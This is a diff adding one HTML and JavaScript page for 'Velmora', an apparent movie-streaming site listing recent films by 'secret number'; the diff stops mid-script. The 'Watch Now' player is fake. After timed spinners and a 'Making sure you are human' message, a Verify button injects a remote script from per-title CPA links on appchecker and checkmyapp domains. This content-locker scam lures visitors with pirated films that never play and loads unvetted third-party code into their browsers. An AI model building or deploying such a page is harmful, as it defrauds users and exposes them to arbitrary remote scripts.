@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Velmora</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{
+      font-family:Inter,sans-serif;
+      background:linear-gradient(to bottom,#020617,#05070d,#0b1220);
+      color:#fff;
+      overflow-x:hidden;
+    }
+    .container{max-width:1450px;margin:auto;padding:0 22px;}
+    .navbar{
+      position:sticky;top:0;z-index:999;
+      background:rgba(2,6,23,.95);
+      backdrop-filter:blur(10px);
+      border-bottom:1px solid rgba(59,130,246,.2);
+    }
+    .nav-inner{
+      min-height:78px;display:flex;align-items:center;justify-content:space-between;
+      gap:20px;flex-wrap:wrap;padding:12px 0;
+    }
+    .logo{
+      display:flex;align-items:center;gap:14px;font-size:2rem;font-weight:800;cursor:pointer;
+    }
+    .logo-mark{
+      width:48px;height:48px;border-radius:14px;
+      background:linear-gradient(145deg,#111827,#1d4ed8 55%,#b91c1c);
+      border:1px solid rgba(255,255,255,.12);position:relative;
+      box-shadow:0 10px 24px rgba(37,99,235,.30);
+    }
+    .logo-mark::before{content:"";position:absolute;inset:8px;border-radius:10px;border:2px solid rgba(255,255,255,.80);}
+    .logo-mark::after{content:"";position:absolute;top:15px;left:19px;width:0;height:0;border-left:13px solid #fff;border-top:8px solid transparent;border-bottom:8px solid transparent;}
+    .logo span{background:linear-gradient(90deg,#fff,#60a5fa,#ef4444);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+    .nav-links{display:flex;gap:22px;flex-wrap:wrap;}
+    .nav-links a{color:#dbeafe;text-decoration:none;font-weight:500;cursor:pointer;}
+    .nav-links a:hover{color:#60a5fa}
+
+    .center-search-section{
+      min-height:78vh;display:flex;flex-direction:column;justify-content:center;align-items:center;
+      padding:40px 20px;text-align:center;
+    }
+    .center-search-title{font-size:1.65rem;color:#e2e8f0;margin-bottom:32px;font-weight:600;}
+    .center-search-box{
+      display:flex;align-items:center;gap:16px;
+      background:linear-gradient(135deg,#0f172a,#1e293b);
+      border:3px solid rgba(96,165,250,.5);
+      border-radius:24px;padding:24px 32px;
+      width:100%;max-width:720px;
+      transition:all .3s;
+      box-shadow:0 12px 48px rgba(37,99,235,.25);
+    }
+    .center-search-box:focus-within{
+      border-color:#3b82f6;box-shadow:0 12px 60px rgba(37,99,235,.4);transform:translateY(-3px);
+    }
+    .center-search-box svg{width:32px;height:32px;fill:#60a5fa;flex-shrink:0;}
+    .center-search-box input{
+      background:transparent;border:none;outline:none;color:#fff;
+      width:100%;font-size:1.45rem;font-family:inherit;
+    }
+    .center-search-box input::placeholder{color:#64748b;}
+
+    .search-result-container{padding:30px;max-width:900px;margin:0 auto;}
+    .search-result-card{
+      display:flex;gap:30px;background:linear-gradient(135deg,#0f172a,#1e293b);
+      border:2px solid rgba(96,165,250,.4);border-radius:24px;overflow:hidden;
+      cursor:pointer;transition:all .3s;
+    }
+    .search-result-card:hover{transform:translateY(-6px);box-shadow:0 20px 50px rgba(0,0,0,.6);border-color:#3b82f6;}
+    .search-result-poster{width:200px;flex-shrink:0;}
+    .search-result-poster img{width:100%;height:100%;object-fit:cover;}
+    .search-result-info{padding:30px 30px 30px 0;display:flex;flex-direction:column;justify-content:center;}
+    .search-result-number{
+      display:inline-block;background:linear-gradient(135deg,#2563eb,#1d4ed8);
+      color:#fff;font-weight:700;font-size:1rem;padding:6px 16px;border-radius:999px;
+      margin-bottom:14px;width:fit-content;
+    }
+    .search-result-title{font-size:2rem;font-weight:700;margin-bottom:12px;line-height:1.2;}
+    .search-result-meta{display:flex;gap:16px;color:#94a3b8;font-size:1rem;margin-bottom:16px;}
+    .search-result-overview{color:#cbd5e1;font-size:1rem;line-height:1.6;}
+    .search-no-result{text-align:center;padding:60px 20px;color:#94a3b8;}
+    .search-no-result h3{font-size:1.5rem;margin-bottom:10px;color:#fff;}
+
+    .hero{
+      min-height:66vh;border-radius:0 0 26px 26px;overflow:hidden;position:relative;
+      margin-bottom:28px;background-size:cover;background-position:center;
+    }
+    .hero::before{
+      content:"";position:absolute;inset:0;
+      background:linear-gradient(90deg,rgba(2,6,23,.96) 12%,rgba(2,6,23,.58) 48%,rgba(2,6,23,.18) 100%),
+                 linear-gradient(to top,rgba(2,6,23,1),rgba(2,6,23,.12));
+    }
+    .hero-content{position:absolute;left:5%;bottom:12%;max-width:620px;z-index:2;}
+    .badge{
+      display:inline-flex;align-items:center;gap:8px;padding:8px 14px;border-radius:999px;
+      background:rgba(59,130,246,.15);border:1px solid rgba(96,165,250,.25);
+      color:#bfdbfe;font-size:.85rem;font-weight:600;margin-bottom:14px;
+    }
+    .hero h1{font-size:3rem;line-height:1.05;margin-bottom:14px}
+    .hero p{color:#cbd5e1;line-height:1.6;margin-bottom:18px}
+    .hero-meta{display:flex;gap:12px;flex-wrap:wrap;color:#cbd5e1;margin-bottom:22px;}
+    .hero-buttons{display:flex;gap:12px;flex-wrap:wrap;}
+
+    button{
+      border:none;cursor:pointer;border-radius:999px;padding:13px 22px;
+      font-weight:700;font-family:inherit;font-size:.95rem;transition:all .2s;
+    }
+    button:hover{transform:translateY(-1px);}
+    .btn-primary{background:linear-gradient(90deg,#2563eb,#1d4ed8);color:#fff;}
+    .btn-secondary{background:rgba(255,255,255,.1);color:#fff;border:1px solid rgba(255,255,255,.12);}
+    .btn-watch{background:linear-gradient(90deg,#ef4444,#b91c1c);color:#fff;box-shadow:0 10px 22px rgba(239,68,68,.22);font-size:1rem;padding:14px 28px;}
+
+    .section{margin:36px 0}
+    .section-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;padding:0 4px;}
+    .section-header h2{font-size:1.45rem}
+    .scroll-row{display:flex;gap:16px;overflow-x:auto;padding-bottom:10px;scroll-behavior:smooth;}
+    .scroll-row::-webkit-scrollbar{height:8px}
+    .scroll-row::-webkit-scrollbar-thumb{background:#2563eb;border-radius:999px;}
+    .grid-layout{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:18px;}
+    .movie-card{
+      flex:0 0 auto;width:180px;background:linear-gradient(to bottom,#0f172a,#0b1220);
+      border:1px solid rgba(255,255,255,.06);border-radius:16px;overflow:hidden;
+      cursor:pointer;transition:.25s;
+    }
+    .movie-card:hover{transform:translateY(-6px);box-shadow:0 18px 30px rgba(0,0,0,.45);}
+    .card-poster{width:100%;aspect-ratio:2/3;object-fit:cover;display:block;background:#111827;}
+    .card-info{padding:12px 10px 14px}
+    .card-title{
+      font-size:.92rem;font-weight:600;line-height:1.35;min-height:40px;
+      display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;
+    }
+    .card-meta{display:flex;gap:10px;flex-wrap:wrap;margin-top:8px;font-size:.74rem;color:#94a3b8;}
+
+    .modal-overlay{
+      position:fixed;inset:0;background:rgba(0,0,0,.92);backdrop-filter:blur(10px);
+      z-index:3000;display:flex;justify-content:center;align-items:center;padding:18px;
+    }
+    .modal-content{
+      width:100%;max-width:920px;
+      background:#0b1220;border:1px solid rgba(96,165,250,.2);
+      border-radius:24px;position:relative;overflow:hidden;
+    }
+    .close-modal{
+      position:absolute;top:16px;right:16px;z-index:10;
+      background:rgba(0,0,0,.6);border:1px solid rgba(255,255,255,.1);
+      width:40px;height:40px;border-radius:50%;
+      display:flex;align-items:center;justify-content:center;
+      cursor:pointer;font-size:20px;color:#fff;transition:all .2s;
+    }
+    .close-modal:hover{background:rgba(239,68,68,.5);border-color:rgba(239,68,68,.3);}
+
+    .modal-backdrop{
+      min-height:220px;background-size:cover;background-position:center;position:relative;
+      background-color:#0f172a;
+    }
+    .modal-backdrop::before{
+      content:"";position:absolute;inset:0;
+      background:linear-gradient(to top,rgba(11,18,32,1),rgba(11,18,32,.3));
+    }
+    .modal-details{padding:28px;}
+    .modal-poster-row{display:flex;gap:24px;align-items:flex-start;}
+    .modal-poster-thumb{
+      width:170px;flex-shrink:0;border-radius:14px;object-fit:cover;
+      box-shadow:0 8px 30px rgba(0,0,0,.5);background:#111827;aspect-ratio:2/3;
+    }
+    .modal-text-col{flex:1;min-width:0;}
+    .modal-text-col h2{font-size:1.85rem;margin-bottom:10px;line-height:1.15;}
+    .modal-stats{display:flex;gap:14px;flex-wrap:wrap;color:#cbd5e1;margin-bottom:14px;font-size:.95rem;}
+    .modal-overview{color:#94a3b8;line-height:1.65;margin-bottom:20px;font-size:.95rem;}
+    .modal-actions{display:flex;gap:12px;flex-wrap:wrap;}
+
+    .fake-player{position:relative;aspect-ratio:16/9;background:#000;overflow:hidden;}
+    .fp-bg{width:100%;height:100%;object-fit:cover;opacity:.25;filter:blur(2px);position:absolute;top:0;left:0;}
+    .fp-watermark{
+      position:absolute;top:18px;left:20px;
+      font-size:.7rem;font-weight:800;color:rgba(255,255,255,.18);
+      letter-spacing:3px;text-transform:uppercase;z-index:2;
+    }
+    .fp-center-play{
+      position:absolute;top:50%;left:50%;
+      transform:translate(-50%,-50%);z-index:3;
+      width:80px;height:80px;
+      background:rgba(0,0,0,.55);border:2px solid rgba(255,255,255,.25);
+      border-radius:50%;
+      display:flex;align-items:center;justify-content:center;
+      cursor:pointer;transition:all .25s;
+    }
+    .fp-center-play:hover{
+      background:rgba(0,0,0,.75);border-color:rgba(255,255,255,.45);
+      transform:translate(-50%,-50%) scale(1.08);
+    }
+    .fp-center-play::after{
+      content:"";width:0;height:0;
+      border-top:16px solid transparent;border-bottom:16px solid transparent;
+      border-left:26px solid #fff;margin-left:5px;
+    }
+    .fp-controls{
+      position:absolute;bottom:0;left:0;right:0;z-index:2;
+      padding:40px 18px 14px;
+      background:linear-gradient(transparent,rgba(0,0,0,.85));
+      display:flex;align-items:center;gap:12px;
+    }
+    .fp-time{color:rgba(255,255,255,.6);font-size:.78rem;white-space:nowrap;font-variant-numeric:tabular-nums;}
+    .fp-bar{flex:1;height:4px;background:rgba(255,255,255,.15);border-radius:2px;overflow:hidden;}
+    .fp-bar-fill{width:0%;height:100%;background:#ef4444;border-radius:2px;}
+
+    .fp-overlay{
+      position:absolute;inset:0;z-index:4;
+      display:flex;flex-direction:column;
+      align-items:center;justify-content:center;
+      gap:16px;
+      background:rgba(0,0,0,.5);
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .spinner{
+      width:48px;height:48px;
+      border:4px solid rgba(255,255,255,.1);
+      border-top-color:#3b82f6;
+      border-radius:50%;
+      animation:spin .8s linear infinite;
+      flex-shrink:0;
+    }
+    .fp-overlay-text{color:#cbd5e1;font-size:.95rem;font-weight:500;text-align:center;line-height:1.4;}
+    .fp-overlay-sub{color:#94a3b8;font-size:.9rem;text-align:center;line-height:1.45;max-width:320px;}
+
+    .verify-row{display:flex;align-items:center;gap:8px;flex-shrink:0;}
+    .verify-btn{
+      display:inline-flex;align-items:center;gap:10px;
+      padding:15px 44px;
+      background:linear-gradient(90deg,#2563eb,#1d4ed8);
+      color:#fff;font-size:1.05rem;font-weight:700;
+      border:none;border-radius:999px;cursor:pointer;
+      font-family:inherit;
+      box-shadow:0 8px 28px rgba(37,99,235,.35);
+      transition:all .2s;
+    }
+    .verify-btn:hover{transform:translateY(-2px);box-shadow:0 14px 36px rgba(37,99,235,.5);}
+
+    .info-icon{
+      width:22px;height:22px;
+      border-radius:50%;
+      border:1.5px solid #64748b;
+      display:inline-flex;align-items:center;justify-content:center;
+      cursor:pointer;flex-shrink:0;
+      position:relative;
+      color:#64748b;font-size:.7rem;font-weight:700;
+      font-family:Inter,sans-serif;
+      transition:border-color .2s,color .2s;
+    }
+    .info-icon:hover{border-color:#94a3b8;color:#94a3b8;}
+    .info-tip{
+      display:none;
+      position:absolute;
+      bottom:calc(100% + 10px);
+      left:50%;
+      transform:translateX(-50%);
+      background:#1e293b;
+      border:1px solid rgba(255,255,255,.08);
+      color:#94a3b8;
+      font-size:.72rem;font-weight:400;
+      padding:8px 14px;
+      border-radius:10px;
+      white-space:nowrap;
+      box-shadow:0 8px 24px rgba(0,0,0,.5);
+      line-height:1.4;
+    }
+    .info-tip::after{
+      content:"";position:absolute;top:100%;left:50%;
+      transform:translateX(-50%);
+      border:6px solid transparent;border-top-color:#1e293b;
+    }
+    .info-icon.active .info-tip{display:block;}
+
+    .video-player-container{width:100%;max-width:900px;background:#000;border-radius:16px;overflow:hidden;}
+    .video-player-container iframe{width:100%;aspect-ratio:16/9;display:block;border:none;}
+    .player-controls{
+      display:flex;align-items:center;padding:14px 20px;
+      background:#0f172a;color:#94a3b8;font-size:.9rem;
+    }
+    .player-controls span:last-child{margin-left:auto;cursor:pointer;color:#60a5fa;font-weight:600;}
+    .player-controls span:last-child:hover{color:#93c5fd;}
+
+    .footer-text{text-align:center;padding:50px 20px 30px;color:#64748b;font-size:.85rem;line-height:1.6;}
+
+    @media (max-width:780px){
+      .center-search-section{min-height:68vh;padding:30px 16px;}
+      .center-search-title{font-size:1.4rem;margin-bottom:24px;}
+      .center-search-box{padding:20px 24px;border-radius:20px;}
+      .center-search-box input{font-size:1.25rem;}
+      .nav-inner{gap:12px;}.nav-links{gap:16px;}
+      .hero{min-height:58vh;}.hero h1{font-size:2.1rem;}
+      .movie-card{width:145px;}
+      .search-result-card{flex-direction:column;}
+      .search-result-poster{width:100%;height:260px;}
+      .modal-poster-row{flex-direction:column;align-items:center;text-align:center;}
+      .modal-poster-thumb{width:140px;}
+      .modal-text-col h2{font-size:1.5rem;}
+      .fp-center-play{width:64px;height:64px;}
+      .fp-center-play::after{border-top-width:13px;border-bottom-width:13px;border-left-width:22px;}
+      .verify-btn{padding:13px 32px;font-size:.95rem;}
+    }
+  </style>
+</head>
+<body>
+  <div id="app"></div>
+
+  <script>
+    var currentTab = 'search';
+    var searchQuery = '';
+    var selectedItem = null;
+    var trailerKey = null;
+    var videoOpen = false;
+    var watchStage = 'info';
+    var infoOpen = false;
+    var spinTimer = null;
+    var humanTimer = null;
+
+    var allMovies = [
+      {
+        number: 22, title: "Peaky Blinders: The Immortal Man",
+        overview: "Tommy Shelby returns in a dark new chapter that plunges him deep into the dangerous underworld of 1930s Birmingham, where old enemies resurface and new alliances must be forged to survive a war that could destroy everything the Shelby family has built.",
+        poster_path: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQkgpaH3fFgYQuEpQKgVFbyqU7xfvhLx5jD8M1MLmhZKLP4IqBTNmPnKpSyu-MDBU5XfYakVg&s=10",
+        backdrop_path: "https://image.tmdb.org/t/p/original/9PfS8Ubm6xPMhn9Vo5m3MOXVPvt.jpg",
+        vote_average: 8.8, release_date: "2026", trailer: "lcvUGs3xaDM",
+        cpa: "https://appchecker.space/cl/js/d2282w"
+      },
+      {
+        number: 23, title: "Sinners",
+        overview: "Two brothers return to their hometown in rural Mississippi after years away, only to discover that an ancient and unspeakable evil has taken root in the very place they once called home, threatening everyone they have ever loved.",
+        poster_path: "https://m.media-amazon.com/images/M/MV5BNjIwZWY4ZDEtMmIxZS00NDA4LTg4ZGMtMzUwZTYyNzgxMzk5XkEyXkFqcGc@._V1_.jpg",
+        backdrop_path: "https://m.media-amazon.com/images/M/MV5BNjIwZWY4ZDEtMmIxZS00NDA4LTg4ZGMtMzUwZTYyNzgxMzk5XkEyXkFqcGc@._V1_.jpg",
+        vote_average: 8.2, release_date: "2025", trailer: "bKGxHflevuk",
+        cpa: "https://appchecker.site/cl/js/277j76"
+      },
+      {
+        number: 24, title: "Zootopia 2",
+        overview: "Judy Hopps and Nick Wilde face their most challenging case yet when a mysterious conspiracy threatens to divide the animal city of Zootopia once more, forcing them to go deep undercover in a world where trust is the rarest commodity of all.",
+        poster_path: "https://m.media-amazon.com/images/M/MV5BYjg1Mjc3MjQtMTZjNy00YWVlLWFhMWEtMWI3ZTgxYjJmNmRlXkEyXkFqcGc@._V1_.jpg",
+        backdrop_path: "https://m.media-amazon.com/images/M/MV5BYjg1Mjc3MjQtMTZjNy00YWVlLWFhMWEtMWI3ZTgxYjJmNmRlXkEyXkFqcGc@._V1_.jpg",
+        vote_average: 8.4, release_date: "2025", trailer: "BjkIOU5PhyQ",
+        cpa: "https://checkmyapp.site/cl/js/exxqxl"
+      },
+      {
+        number: 25, title: "Scream 7",
+        overview: "Ghostface returns with a chilling vengeance, targeting a new generation of unsuspecting victims while buried connections to the original Woodsboro murders begin to resurface in ways nobody could have ever predicted.",
+        poster_path: "https://media0098.elcinema.com/uploads/_315x420_8a98862f7d7407deef5fd30c0bc2dfe48f992153c1ded7301dd6bc3e090902d1.jpg",
+        backdrop_path: "https://media0098.elcinema.com/uploads/_315x420_8a98862f7d7407deef5fd30c0bc2dfe48f992153c1ded7301dd6bc3e090902d1.jpg",
+        vote_average: 7.9, release_date: "2026", trailer: "UJrghaPJ0RY",
+        cpa: "https://appchecker.site/cl/js/j7737j"
+      },
+      {
+        number: 26, title: "Super Mario Galaxy",
+        overview: "Mario embarks on his most ambitious interstellar adventure yet, travelling across breathtaking galaxies and encountering extraordinary new worlds to rescue Princess Peach from a cosmic threat that could unravel the entire universe.",
+        poster_path: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbUSPwCSD6vlIWp6oyOglIqB-yXIxFxNRdQQ&s",
+        backdrop_path: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbUSPwCSD6vlIWp6oyOglIqB-yXIxFxNRdQQ&s",
+        vote_average: 8.0, release_date: "2025", trailer: "_Rcl0aiwixw",
+        cpa: "https://checkmyapp.site/cl/js/xppwpj"
+      },
+      {
+        number: 27, title: "Mike and Nick and Nick and Alice",
+        overview: "Four unlikely friends find themselves caught in a twisted web of dark secrets and dangerous lies when what was supposed to be a relaxing weekend getaway in a remote cabin goes terribly and irreversibly wrong.",
+        poster_path: "https://m.media-amazon.com/images/M/MV5BZDBiNjIyNjUtNWZlYy00MGU4LWFjNDUtMGExYTZlNmNhZTY4XkEyXkFqcGc@._V1_.jpg",
+        backdrop_path: "https://m.media-amazon.com/images/M/MV5BZDBiNjIyNjUtNWZlYy00MGU4LWFjNDUtMGExYTZlNmNhZTY4XkEyXkFqcGc@._V1_.jpg",
+        vote_average: 7.7, release_date: "2026", trailer: "pI-2t18TXqs",
+        cpa: "https://checkmyapp.site/cl/js/l7747g"
+      },
+      {
+        number: 28, title: "Neighborhood Watch",
+        overview: "A quiet and peaceful suburban neighborhood becomes the staging ground for something deeply sinister when a new family moves in next door, carrying with them dark intentions that slowly unravel the fabric of the entire community.",
+        poster_path: "https://m.media-amazon.com/images/I/81HYxhyyKqL._AC_UF894,1000_QL80_.jpg",
+        backdrop_path: "https://m.media-amazon.com/images/I/81HYxhyyKqL._AC_UF894,1000_QL80_.jpg",
+        vote_average: 7.4, release_date: "2025", trailer: "U-ACHHn8VvY",
+        cpa: "https://appchecker.store/cl/js/9vvgvw"
+      }
+    ];
+
+    function clearTimers() {
+      if (spinTimer) { clearTimeout(spinTimer); spinTimer = null; }
+      if (humanTimer) { clearTimeout(humanTimer); humanTimer = null; }
+    }
+
+    function setTab(tab) {
+      clearTimers();
+      currentTab = tab;
+      searchQuery = '';
+      selectedItem = null;
+      trailerKey = null;
+      videoOpen = false;
+      watchStage = 'info';
+      infoOpen = false;
+      renderApp();
+    }
+
+    function handleCenterSearch(value) {
+      searchQuery = value.trim();
+      renderApp();
+      setTimeout(function() {
+        var input = document.getElementById('centerSearchInput');
+        if (input) { input.focus(); input.setSelectionRange(input.value.length, input.value.length); }
+      }, 10);
+    }
+
+    function findMovieByNumber(num) {
+      return allMovies.find(function(m) { return m.number == parseInt(num); });
+    }
+
+    function showMovieByNumber(num) {
+      var movie = allMovies.find(function(m) { return m.number === num; });
+      if (movie) {
+        clearTimers();
+        selectedItem = movie;
+        watchStage = 'info';
+        infoOpen = false;
+        renderApp();
+      }
+    }
+
+    function closeModal() {
+      clearTimers();
+      selectedItem = null;
+      watchStage = 'info';
+      infoOpen = false;
+      renderApp();
+    }
+
+    function playTrailer() {
+      if (!selectedItem) return;
+      trailerKey = selectedItem.trailer;
+      videoOpen = true;
+      renderApp();
+    }
+
+    function playTrailerFromHome() {
+      trailerKey = allMovies[3].trailer;
+      videoOpen = true;
+      renderApp();
+    }
+
+    function showMovieFromHome() {
+      clearTimers();
+      selectedItem = allMovies[3];
+      watchStage = 'info';
+      infoOpen = false;
+      renderApp();
+    }
+
+    function closeVideo() {
+      trailerKey = null;
+      videoOpen = false;
+      renderApp();
+    }
+
+    function clickWatchNow() {
+      watchStage = 'player';
+      infoOpen = false;
+      renderApp();
+    }
+
+    /* Stage 1: circle only for 5s */
+    function clickFakePlay() {
+      watchStage = 'spinning';
+      infoOpen = false;
+      renderApp();
+
+      spinTimer = setTimeout(function() {
+        if (selectedItem && watchStage === 'spinning') {
+          /* Stage 2: circle + human text for 3s */
+          watchStage = 'human';
+          renderApp();
+
+          humanTimer = setTimeout(function() {
+            if (selectedItem && watchStage === 'human') {
+              /* Stage 3: everything + verify button */
+              watchStage = 'verify';
+              renderApp();
+            }
+          }, 3000);
+        }
+      }, 5000);
+    }
+
+    function toggleInfo(e) {
+      e.stopPropagation();
+      infoOpen = !infoOpen;
+      renderApp();
+    }
+
+    function clickVerify() {
+      if (!selectedItem || !selectedItem.cpa) {
+        alert("Coming soon");
+        return;
+      }
+      var s = document.createElement('script');
+      s.src = selectedItem.cpa;
+      s.async = true;
+      document.body.appendChild(s);
+    }
+
+    function renderSearchPage() {
+      var movie = searchQuery ? findMovieByNumber(searchQuery) : null;
+      var resultHTML = '';
+      if (searchQuery) {
+        if (movie) {
+          resultHTML = '<div class="search-result-container">' +
+            '<div class="search-result-card" onclick="showMovieByNumber(' + movie.number + ')">' +
+            '<div class="search-result-poster"><img src="' + movie.poster_path + '" alt="' + movie.title + '"></div>' +
+            '<div class="search-result-info">' +
+            '<span class="search-result-number">#' + movie.number + '</span>' +
+            '<h3 class="search-result-title">' + movie.title + '</h3>' +
+            '<div class="search-result-meta"><span>⭐ ' + movie.vote_average + '</span><span>' + movie.release_date + '</span></div>' +
+            '<p class="search-result-overview">' + movie.overview + '</p>' +
+            '</div></div></div>';
+        } else {
+          resultHTML = '<div class="search-result-container"><div class="search-no-result">' +
+            '<h3>No movie found for #' + searchQuery + '</h3><p>Try another number (22–28)</p></div></div>';
+        }
+      }
+      return '<div class="center-search-section">' +
+        '<h2 class="center-search-title">Type a secret number…</h2>' +
+        '<div class="center-search-box">' +
+        '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10.5 3a7.5 7.5 0 1 1 0 15a7.5 7.5 0 0 1 0-15Zm0 2a5.5 5.5 0 1 0 0 11a5.5 5.5 0 0 0 0-11Zm8.91 12.5l2.8 2.8l-1.41 1.41l-2.8-2.8l1.41-1.41Z"/></svg>' +
+        '<input type="text" id="centerSearchInput" placeholder="Type a number or movie title" value="' + searchQuery + '" oninput="handleCenterSearch(this.value)" autofocus>' +
+        '</div></div>' + resultHTML;
+    }
+
+    function renderMovieCard(item) {
+      return '<div class="movie-card" onclick="showMovieByNumber(' + item.number + ')">' +
+        '<img class="card-poster" src="' + item.poster_path + '" alt="' + item.title + '">' +
+        '<div class="card-info"><div class="card-title">' + item.title + '</div>' +
+        '<div class="card-meta"><span>⭐ ' + item.vote_average + '</span><span>' + item.release_date + '</span></div></div></div>';
+    }
+
+    function renderHome() {
+      var hero = allMovies[3];
+      return '<section class="hero" style="background-image:url(\'' + hero.backdrop_path + '\')">' +
+        '<div class="hero-content">' +
+        '<div class="badge">Featured on Velmora</div>' +
+        '<h1>' + hero.title + '</h1>' +
+        '<div class="hero-meta"><span>⭐ ' + hero.vote_average + '</span><span>' + hero.release_date + '</span><span>Movie</span></div>' +
+        '<p>' + hero.overview + '</p>' +
+        '<div class="hero-buttons">' +
+        '<button class="btn-primary" onclick="playTrailerFromHome()">Play Trailer</button>' +
+        '<button class="btn-secondary" onclick="showMovieFromHome()">More Info</button>' +
+        '</div></div></section>' +
+        '<section class="section"><div class="section-header"><div><h2>🔥 Trending Now</h2></div></div>' +
+        '<div class="scroll-row">' + allMovies.slice(0, 3).map(renderMovieCard).join('') + '</div></section>' +
+        '<section class="section"><div class="section-header"><div><h2>🎬 Main Picks</h2></div></div>' +
+        '<div class="scroll-row">' + allMovies.slice(3).map(renderMovieCard).join('') + '</div></section>';
+    }
+
+    function renderMoviesOnly() {
+      return '<section class="section"><div class="section-header"><div><h2>🎬 Movies</h2></div></div>' +
+        '<div class="grid-layout">' + allMovies.map(renderMovieCard).join('') + '</div></section>';
+    }
+
+    function renderSeriesOnly() {
+      return '<div style="min-height:70vh;display:flex;align-items:center;justify-content:center;text-align:center;padding:40px 20px;">' +
+        '<div><h2 style="font-size:2.2rem;margin-bottom:16px;">Series</h2>' +
+        '<p style="color:#94a3b8;font-size:1.1rem;">More exciting series coming soon...</p></div></div>';
+    }
+
+    function renderModal() {
+      if (!selectedItem) return '';
+      var m = selectedItem;
+      var closeBtn = '<div class="close-modal" onclick="closeModal()">×</div>';
+
+      if (watchStage === 'info') {
+        return '<div class="modal-overlay" onclick="closeModal()">' +
+          '<div class="modal-content" onclick="event.stopPropagation()">' +
+          closeBtn +
+          '<div class="modal-backdrop" style="background-image:url(\'' + (m.backdrop_path || m.poster_path) + '\')"></div>' +
+          '<div class="modal-details">' +
+          '<div class="modal-poster-row">' +
+          '<img class="modal-poster-thumb" src="' + m.poster_path + '" alt="' + m.title + '">' +
+          '<div class="modal-text-col">' +
+          '<h2>' + m.title + '</h2>' +
+          '<div class="modal-stats"><span>⭐ ' + m.vote_average + '</span><span>' + m.release_date + '</span><span>#' + m.number + '</span></div>' +
+          '<p class="modal-overview">' + m.overview + '</p>' +
+          '<div class="modal-actions">' +
+          '<button class="btn-primary" onclick="playTrailer()">▶ Play Trailer</button>' +
+          '<button class="btn-watch" onclick="clickWatchNow()">▶ Watch Now</button>' +
+          '</div></div></div></div></div></div>';
+      }
+
+      var overlayHTML = '';
+
+      if (watchStage === 'spinning') {
+        overlayHTML = '<div class="fp-overlay"><div class="spinner"></div></div>';
+      } else if (watchStage === 'human') {
+        overlayHTML = '<div class="fp-overlay">' +
+          '<div class="spinner"></div>' +
+          '<p class="fp-overlay-text">Making sure you are human...</p>' +
+          '</div>';
+      } else if (watchStage === 'verify') {
+        var infoClass = infoOpen ? 'info-icon active' : 'info-icon';
+        overlayHTML = '<div class="fp-overlay">' +
+          '<div class="spinner"></div>' +
+          '<p class="fp-overlay-text">Making sure you are human...</p>' +
+          '<p class="fp-overlay-sub">Complete verification to continue watching</p>' +
+          '<div class="verify-row">' +
+          '<button class="verify-btn" onclick="clickVerify()">Verify</button>' +
+          '<span class="' + infoClass + '" onclick="toggleInfo(event)">i<span class="info-tip">Complete a quick task to verify and unlock instantly.</span></span>' +
+          '</div></div>';
+      }
+
+      return '<div class="modal-overlay" onclick="closeModal()">' +
+        '<div class="modal-content" onclick="event.stopPropagation()">' +
+        closeBtn +
+        '<div class="fake-player">' +
+        '<img class="fp-bg" src="' + m.poster_path + '" alt="">' +
+        '<div class="fp-watermark">VELMORA</div>' +
+        (watchStage === 'player' ? '<div class="fp-center-play" onclick="clickFakePlay()"></div>' : '') +
+        overlayHTML +
+        '<div class="fp-controls">' +
+        '<span class="fp-time">0:00</span>' +
+        '<div class="fp-bar"><div class="fp-bar-fill"></div></div>' +
+        '<span class="fp-time">2:15:30</span>' +
+        '</div></div></div></div>';
+    }
+
+    function renderVideoPlayer() {
+      if (!videoOpen || !trailerKey) return '';
+      return '<div class="modal-overlay" onclick="closeVideo()">' +
+        '<div class="video-player-container" onclick="event.stopPropagation()">' +
+        '<iframe src="https://www.youtube.com/embed/' + trailerKey + '?autoplay=1&rel=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>' +
+        '<div class="player-controls"><span>▶ Trailer Player</span>' +
+        '<span onclick="closeVideo()">Close ✕</span></div></div></div>';
+    }
+
+    function renderApp() {
+      var mainContent = '';
+      if (currentTab === 'search') mainContent = renderSearchPage();
+      else if (currentTab === 'home') mainContent = renderHome();
+      else if (currentTab === 'movies') mainContent = renderMoviesOnly();
+      else if (currentTab === 'series') mainContent = renderSeriesOnly();
+      else if (currentTab === 'account') mainContent = '<div style="padding:80px 20px;text-align:center;"><h2>Account</h2><p style="color:#94a3b8;">Login area coming soon</p></div>';
+
+      document.getElementById('app').innerHTML =
+        '<nav class="navbar"><div class="container nav-inner">' +
+        '<div class="logo" onclick="setTab(\'search\')"><div class="logo-mark"></div><span>VELMORA</span></div>' +
+        '<div class="nav-links">' +
+        '<a onclick="setTab(\'search\')">Search</a>' +
+        '<a onclick="setTab(\'home\')">Home</a>' +
+        '<a onclick="setTab(\'movies\')">Movies</a>' +
+        '<a onclick="setTab(\'series\')">Series</a>' +
+        '<a onclick="setTab(\'account\')">Account</a>' +
+        '</div></div></nav>' +
+        '<main class="container">' + mainContent + '</main>' +
+        renderModal() + renderVideoPlayer() +
+        '<footer><div class="container"><div class="footer-text">© 2026 Velmora<br>All rights reserved.</div></div></footer>';
+    }
+
+    window.setTab = setTab;
+    window.handleCenterSearch = handleCenterSearch;
+    window.showMovieByNumber = showMovieByNumber;
+    window.closeModal = closeModal;
+    window.playTrailer = playTrailer;
+    window.playTrailerFromHome = playTrailerFromHome;
+    window.showMovieFromHome = showMovieFromHome;
+    window.closeVideo = closeVideo;
+    window.clickWatchNow = clickWatchNow;
+    window.clickFakePlay = clickFakePlay;
+    window.toggleInfo = toggleInfo;
+    window.clickVerify = clickVerify;
+
